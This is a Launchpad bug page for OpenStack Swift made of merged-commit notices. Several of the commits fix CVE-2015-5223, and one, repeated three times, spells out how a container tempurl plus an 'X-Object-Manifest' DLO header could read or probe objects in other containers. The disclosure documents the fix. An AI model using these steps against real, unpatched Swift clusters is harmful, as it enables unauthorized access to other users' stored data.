Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47

| **tags**: | added: in-feature-crypto |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-04:  [**Fix merged to swift (stable/kilo)**](/swift/%2Bbug/1449212/comments/98) |  |  | [#98](/swift/%2Bbug/1449212/comments/98) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/98/%2Bdownload) (3.3 KiB)

Reviewed: <https://review.openstack.org/217255>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=f81435d340140a0b54ac555870423894ee9b2131>

Submitter: Jenkins

Branch: stable/kilo

commit f81435d340140a0b54ac555870423894ee9b2131

Author: Samuel Merritt <email address hidden>

Date: Tue Aug 11 09:10:13 2015 -0500

Better scoping for tempurls, especially container tempurls

It used to be that a GET of a tempurl referencing a large object would

    let you download that large object regardless of where its segments

    lived. However, this led to some violated user expectations around

    container tempurls.

(Note on shorthand: all tempurls reference objects. However, "account

    tempurl" and "container tempurl" are shorthand meaning tempurls

    generated using a key on the account or container, respectively.)

Let's say an application is given tempurl keys to a particular

    container, and it does all its work therein using those keys. The user

    expects that, if the application is compromised, then the attacker

    only gains access to the "compromised-container". However, with the old

    behavior, the attacker could read data from \*any\* container like so:

1) Choose a "victim-container" to download

2) Create PUT and GET tempurl for any object name within the

       "compromised-container". The object doesn't need to exist;

       we'll create it.

3) Using the PUT tempurl, upload a DLO manifest with

       "X-Object-Manifest: /victim-container/"

4) Using the GET tempurl, download the object created in step 3. The

       result will be the concatenation of all objects in the

       "victim-container".

Step 3 need not be for all objects in the "victim-container"; for

    example, a value "X-Object-Manifest: /victim-container/abc" would only

    be the concatenation of all objects whose names begin with "abc". By

    probing for object names in this way, individual objects may be found

    and extracted.

A similar bug would exist for manifests referencing other accounts

    except that neither the X-Object-Manifest (DLO) nor the JSON manifest

    document (SLO) have a way of specifying a different account.

This change makes it so that a container tempurl only grants access to

    objects within its container, \*including\* large-object segments. This

    breaks backward compatibility for container tempurls that may have

    pointed to cross container \*LO's, but (a) there are security

    implications, and (b) container tempurls are a relatively new feature.

This works by having the tempurl middleware install an authorization

    callback ('swift.authorize' in the WSGI environment) that limits the

    scope of any requests to the account or container from which the key

    came.

This requires swift.authorize to persist for both the manifest request

    and all segment requests; this is done by having the proxy server

    restore it to the WSGI environment prior to returning from \_\_call\_\_.

[CVE-2015-5223]

Co-Authored-By: Clay Gerrard <email address hidden>

    Co-Authored-By: Alistair Coles <alistair.co...

[Read more...](/swift/%2Bbug/1449212/comments/98)

Reviewed: https://review.openstack.org/217255
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=f81435d340140a0b54ac555870423894ee9b2131
Submitter: Jenkins
Branch: stable/kilo
commit f81435d340140a0b54ac555870423894ee9b2131
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Closes-Bug: 1449212
Change-Id: I11078af178cb9acdd9039388282fcd0db165ba7a

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-09-08

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Fix proposed to swift (feature/hummingbird)**](/swift/%2Bbug/1449212/comments/99) |  |  | [#99](/swift/%2Bbug/1449212/comments/99) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/hummingbird

Review: <https://review.openstack.org/221410>

Fix proposed to branch: feature/hummingbird
Review: https://review.openstack.org/221410

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Fix merged to swift (feature/hummingbird)**](/swift/%2Bbug/1449212/comments/100) |  |  | [#100](/swift/%2Bbug/1449212/comments/100) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/100/%2Bdownload) (70.7 KiB)

Reviewed: <https://review.openstack.org/221410>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527>

Submitter: Jenkins

Branch: feature/hummingbird

commit cb683d391cb66d0f52830de16760c80fd2afedf9

Author: OpenStack Proposal Bot <email address hidden>

Date: Sat Sep 5 06:17:51 2015 +0000

Imported Translations from Transifex

For more information about this automatic import see:

    <https://wiki.openstack.org/wiki/Translations/Infrastructure>

Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655

Author: Emett Speer <email address hidden>

Date: Wed Sep 2 17:18:03 2015 -0700

[Labs] Update links to Cloud Admin Guide

Update links to the Cloud Admin Guide after the

    RST conversion of that book altered URLs.

Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59

Author: Christian Schwede <email address hidden>

Date: Wed Sep 2 10:52:34 2015 +0000

Test if container\_sweep is executed on unmounted devices

This change ensures that container\_sweep is not run if a device is not mounted

    and mount\_check is set to True.

Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 615c7a204b9386e05c5bab658bfe96766ad1e680

Author: Brian Cline <email address hidden>

Date: Tue Sep 1 10:51:20 2015 -0500

Adds useful dispersion info from changelog

Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c

Author: janonymous <email address hidden>

Date: Sun Aug 2 21:29:13 2015 +0530

Replace a / b with a // b to use integer division where needed

Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender th...

Reviewed: https://review.openstack.org/221410
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527
Submitter: Jenkins
Branch: feature/hummingbird
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
